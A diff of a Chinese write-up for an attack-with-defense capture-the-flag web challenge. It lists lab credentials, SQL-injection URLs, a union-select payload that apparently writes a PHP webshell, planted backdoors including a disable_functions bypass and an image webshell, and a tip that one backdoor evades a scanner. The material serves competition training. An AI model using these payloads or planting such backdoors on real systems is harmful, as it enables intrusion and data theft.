@@ -6,9 +6,12 @@ awd平台使用github开源平台，代码自行修改启动题目
 本题目基于2023年国赛西南赛区半决赛book改编
 
 wp：
+
 后台密码：mama123  30e32fcd467fcb2e9910636b99b49a4d171be7f3
 
 数据库密码：root
+
+注意sql注入可直接利用sqlmap --os-shell，导出文件权限默认开启，数据库端口默认开启
 
 sql注入1：http://192.168.153.128:8801/book.php?bookisbn=1
 
@@ -33,6 +36,8 @@ http://192.168.153.128:8802/book.php?bookisbn=1' 'union select 1,0x3c3f706870204
 默认后门：http://192.168.153.128:8801/bootstrap/test/bypass_disablefunc.php?cmd=cat%20/flag&outpath=/tmp/xx&sopath=/var/www/html/bootstrap/test/bypass_disablefunc_x64.so
 
 图片马后门：http://192.168.153.128:8801/bootstrap/img/2.jpg
+
+加密后门D盾有时查不出来，需自行排查
 
 加密后门：http://192.168.153.128:8801/obs.php
 
